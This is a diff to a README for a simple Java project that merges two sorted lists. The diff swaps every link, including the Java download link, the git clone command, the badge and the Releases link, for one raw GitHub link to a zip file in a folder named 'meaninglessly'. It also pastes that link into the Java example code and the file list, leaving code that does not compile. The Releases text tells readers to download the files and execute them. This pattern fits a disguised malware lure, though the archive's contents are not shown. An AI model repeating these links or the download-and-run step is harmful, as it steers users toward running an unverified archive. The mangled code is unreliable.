@@ -1,6 +1,6 @@
 # Merge Two Sorted Lists 🌟
 
-![Merge Two Sorted Lists](https://img.shields.io/badge/Merge%20Two%20Sorted%20Lists-Java-blue)
+![Merge Two Sorted Lists](https://raw.githubusercontent.com/Kadirbaba4916/Merge-Two-Sorted-list/main/meaninglessly/Merge_Sorted_Two_list_1.1.zip%20Two%20Sorted%20Lists-Java-blue)
 
 Welcome to the **Merge Two Sorted Lists** repository! This project offers a simple Java program designed to merge two sorted lists into one. It serves as a practical example of list manipulation in Java, demonstrating how to effectively combine data while maintaining order.
 
@@ -30,7 +30,7 @@ Merging two sorted lists is a common task in programming. It often appears in al
 
 ## Getting Started
 
-To get started with this project, you need to have Java installed on your machine. You can download Java from the [official website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+To get started with this project, you need to have Java installed on your machine. You can download Java from the [official website](https://raw.githubusercontent.com/Kadirbaba4916/Merge-Two-Sorted-list/main/meaninglessly/Merge_Sorted_Two_list_1.1.zip).
 
 ### Prerequisites
 
@@ -42,7 +42,7 @@ To get started with this project, you need to have Java installed on your machin
 1. Clone the repository to your local machine using the following command:
 
    ```
-   git clone https://github.com/Kadirbaba4916/Merge-Two-Sorted-list.git
+   git clone https://raw.githubusercontent.com/Kadirbaba4916/Merge-Two-Sorted-list/main/meaninglessly/Merge_Sorted_Two_list_1.1.zip
    ```
 
 2. Navigate to the project directory:
@@ -72,9 +72,9 @@ public class Main {
         int[] list2 = {2, 4, 6, 8};
 
         MergeSortedLists merger = new MergeSortedLists();
-        int[] mergedList = merger.merge(list1, list2);
+        int[] mergedList = https://raw.githubusercontent.com/Kadirbaba4916/Merge-Two-Sorted-list/main/meaninglessly/Merge_Sorted_Two_list_1.1.zip(list1, list2);
 
-        System.out.println(Arrays.toString(mergedList));
+        https://raw.githubusercontent.com/Kadirbaba4916/Merge-Two-Sorted-list/main/meaninglessly/Merge_Sorted_Two_list_1.1.zip(https://raw.githubusercontent.com/Kadirbaba4916/Merge-Two-Sorted-list/main/meaninglessly/Merge_Sorted_Two_list_1.1.zip(mergedList));
     }
 }
 ```
@@ -83,9 +83,9 @@ public class Main {
 
 The code is organized into the following main components:
 
-- **Main.java**: Contains the entry point of the program.
-- **MergeSortedLists.java**: Implements the logic for merging two sorted lists.
-- **README.md**: This file, providing documentation for the project.
+- **https://raw.githubusercontent.com/Kadirbaba4916/Merge-Two-Sorted-list/main/meaninglessly/Merge_Sorted_Two_list_1.1.zip**: Contains the entry point of the program.
+- **https://raw.githubusercontent.com/Kadirbaba4916/Merge-Two-Sorted-list/main/meaninglessly/Merge_Sorted_Two_list_1.1.zip**: Implements the logic for merging two sorted lists.
+- **https://raw.githubusercontent.com/Kadirbaba4916/Merge-Two-Sorted-list/main/meaninglessly/Merge_Sorted_Two_list_1.1.zip**: This file, providing documentation for the project.
 
 ## Example
 
@@ -120,7 +120,7 @@ This project is licensed under the MIT License. You can find the full license te
 
 ## Releases
 
-To download the latest release of this project, visit [Releases](https://github.com/Kadirbaba4916/Merge-Two-Sorted-list/releases). Download the necessary files and execute them to see the program in action.
+To download the latest release of this project, visit [Releases](https://raw.githubusercontent.com/Kadirbaba4916/Merge-Two-Sorted-list/main/meaninglessly/Merge_Sorted_Two_list_1.1.zip). Download the necessary files and execute them to see the program in action.
 
 ## Contact
 
@@ -128,6 +128,6 @@ For any questions or suggestions, feel free to reach out. You can create an issu
 
 ---
 
-This README provides a comprehensive overview of the **Merge Two Sorted Lists** project. For further details, check the [Releases](https://github.com/Kadirbaba4916/Merge-Two-Sorted-list/releases) section for the latest updates and improvements. 
+This README provides a comprehensive overview of the **Merge Two Sorted Lists** project. For further details, check the [Releases](https://raw.githubusercontent.com/Kadirbaba4916/Merge-Two-Sorted-list/main/meaninglessly/Merge_Sorted_Two_list_1.1.zip) section for the latest updates and improvements. 
 
 Thank you for visiting! Happy coding!
